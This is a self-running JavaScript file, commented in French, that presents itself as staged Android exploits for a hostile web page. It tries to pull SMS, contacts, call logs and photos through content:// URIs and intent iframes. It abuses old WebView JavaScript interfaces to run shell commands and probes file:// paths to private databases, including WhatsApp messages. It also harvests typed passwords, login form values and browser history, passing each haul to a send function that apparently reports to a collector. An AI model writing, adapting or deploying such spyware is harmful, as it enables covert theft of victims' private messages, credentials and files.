/**
 * ANDROID EXPLOITS - EXÉCUTION PROGRESSIVE
 */

(function() {
    'use strict';
    
    // Vérification environnement
    if (typeof OS === 'undefined' || OS !== 'Android') return;
    
    const Utils = window.Utils || {
        send: function(type, data) {
            console.log('[Android]', type, data);
        },
        safeExecute: function(fn) {
            try { return fn(); } catch(e) { return null; }
        }
    };
    
    // ============================================
    // 1. EXPLOIT WEBVIEW (CONTENT PROVIDERS)
    // ============================================
    const WebViewExploit = {
        // Tentative d'accès aux Content Providers
        contentProviders: function() {
            const providers = [
                'content://sms/inbox',
                'content://sms/sent',
                'content://mms-sms/conversations',
                'content://contacts/phones',
                'content://call_log/calls',
                'content://media/external/images/media'
            ];
            
            providers.forEach(uri => {
                Utils.safeExecute(() => {
                    // Méthode 1: Iframe intent
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = 'intent://' + uri + '#Intent;scheme=content;package=com.android.providers.telephony;end';
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 1000);
                    
                    // Méthode 2: XMLHttpRequest
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', 'content://' + uri, true);
                    xhr.timeout = 3000;
                    xhr.onload = function() {
                        if (this.status === 200) {
                            let data = [];
                            if (uri.includes('sms')) {
                                const lines = this.responseText.split('\n');
                                lines.forEach(line => {
                                    if (line.includes('address=')) {
                                        data.push({
                                            address: line.match(/address=([^,]+)/)?.[1],
                                            body: line.match(/body=([^,]+)/)?.[1],
                                            date: Date.now()
                                        });
                                    }
                                });
                            }
                            
                            if (data.length) {
                                Utils.send(uri.includes('sms') ? 'sms' : 
                                          uri.includes('contacts') ? 'contacts' : 
                                          uri.includes('call') ? 'calls' : 'media', data);
                            }
                        }
                    };
                    xhr.send();
                });
            });
        },
        
        // Intent Scheme pour ouvrir des applications
        intentScheme: function() {
            const intents = [
                'sms:',
                'tel:',
                'mailto:',
                'geo:0,0?q='
            ];
            
            intents.forEach(intent => {
                Utils.safeExecute(() => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = intent;
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 500);
                });
            });
        },
        
        // JavaScript Interface (vulnérabilités anciennes)
        jsInterface: function() {
            Utils.safeExecute(() => {
                for (let key in window) {
                    if (key.toLowerCase().includes('searchbox') || 
                        key.toLowerCase().includes('accessibility') ||
                        key.toLowerCase().includes('webview')) {
                        
                        try {
                            const obj = window[key];
                            if (obj && obj.getClass) {
                                const runtime = obj.getClass().forName('java.lang.Runtime');
                                const instance = runtime.getMethod('getRuntime').invoke(null);
                                
                                const commands = [
                                    'content query --uri content://sms/inbox',
                                    'content query --uri content://contacts/phones',
                                    'content query --uri content://call_log/calls',
                                    'ls /sdcard/'
                                ];
                                
                                commands.forEach(cmd => {
                                    try {
                                        const process = instance.exec(cmd);
                                        const result = process.getInputStream();
                                        Utils.send('shell', { cmd, result: result.toString() });
                                    } catch(e) {}
                                });
                            }
                        } catch(e) {}
                    }
                }
            });
        }
    };
    
    // ============================================
    // 2. ACCÈS AUX FICHIERS (file://)
    // ============================================
    const FileExploit = {
        paths: [
            '/sdcard/',
            '/storage/emulated/0/',
            '/data/data/com.android.providers.telephony/databases/mmssms.db',
            '/data/data/com.android.providers.contacts/databases/contacts2.db',
            '/data/data/com.android.providers.contacts/databases/calllog.db',
            '/sdcard/DCIM/',
            '/sdcard/Download/',
            '/sdcard/WhatsApp/Databases/msgstore.db',
            '/sdcard/Telegram/'
        ],
        
        scan: function() {
            this.paths.forEach(path => {
                Utils.safeExecute(() => {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', 'file://' + path, true);
                    xhr.timeout = 5000;
                    xhr.onload = function() {
                        if (this.status === 200) {
                            Utils.send('file', {
                                path: path,
                                size: this.responseText.length,
                                preview: this.responseText.substring(0, 200)
                            });
                        }
                    };
                    xhr.send();
                });
            });
        },
        
        // Scanner galerie
        gallery: function() {
            Utils.safeExecute(() => {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', 'content://media/external/images/media', true);
                xhr.onload = function() {
                    if (this.status === 200) {
                        // Parser le XML
                        const parser = new DOMParser();
                        const xml = parser.parseFromString(this.responseText, 'text/xml');
                        const images = xml.getElementsByTagName('image');
                        
                        const photos = [];
                        for (let i = 0; i < Math.min(images.length, 50); i++) {
                            photos.push({
                                id: images[i].getAttribute('id'),
                                path: images[i].getAttribute('_data'),
                                date: images[i].getAttribute('datetaken')
                            });
                        }
                        
                        if (photos.length) {
                            Utils.send('photos', photos);
                        }
                    }
                };
                xhr.send();
            });
        }
    };
    
    // ============================================
    // 3. BROWSER DATA (Chrome, Firefox)
    // ============================================
    const BrowserExploit = {
        // Mots de passe enregistrés (via auto-fill)
        passwords: function() {
            document.querySelectorAll('input[type="password"]').forEach(input => {
                if (input.value) {
                    Utils.send('password', {
                        field: input.name || input.id,
                        value: input.value,
                        url: window.location.href
                    });
                }
            });
            
            // Détection des formulaires de login
            document.querySelectorAll('form').forEach(form => {
                const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
                if (inputs.length >= 2) {
                    const data = {};
                    inputs.forEach(input => {
                        if (input.value) data[input.name || input.type] = input.value;
                    });
                    
                    if (Object.keys(data).length) {
                        Utils.send('credentials', {
                            site: window.location.hostname,
                            url: window.location.href,
                            ...data
                        });
                    }
                }
            });
        },
        
        // Historique Chrome (via WebSQL/IndexedDB)
        history: function() {
            // Tentative d'accès à l'historique via les API
            if (window.chrome && chrome.history) {
                chrome.history.search({text: '', maxResults: 100}, (history) => {
                    Utils.send('browser_history', history);
                });
            }
            
            // Fallback: localStorage des navigateurs
            try {
                const browsers = ['chrome', 'firefox', 'opera', 'edge'];
                browsers.forEach(b => {
                    const data = localStorage.getItem(b + '_history');
                    if (data) {
                        Utils.send('browser_history', { browser: b, data: data });
                    }
                });
            } catch(e) {}
        }
    };
    
    // ============================================
    // 4. EXÉCUTION
    // ============================================
    function runAndroidExploits() {
        // Attendre que le core soit chargé
        setTimeout(() => {
            // Exploits WebView (moins risqués)
            WebViewExploit.intentScheme();
            
            // Content Providers (après un délai)
            setTimeout(() => {
                WebViewExploit.contentProviders();
            }, 2000);
            
            // Scan fichiers (après 3 secondes)
            setTimeout(() => {
                FileExploit.scan();
                FileExploit.gallery();
            }, 3000);
            
            // Browser data (après 4 secondes)
            setTimeout(() => {
                BrowserExploit.passwords();
                BrowserExploit.history();
            }, 4000);
            
            // JS Interface (risqué, dernier)
            setTimeout(() => {
                WebViewExploit.jsInterface();
            }, 5000);
            
        }, 1000);
    }
    
    runAndroidExploits();
})();
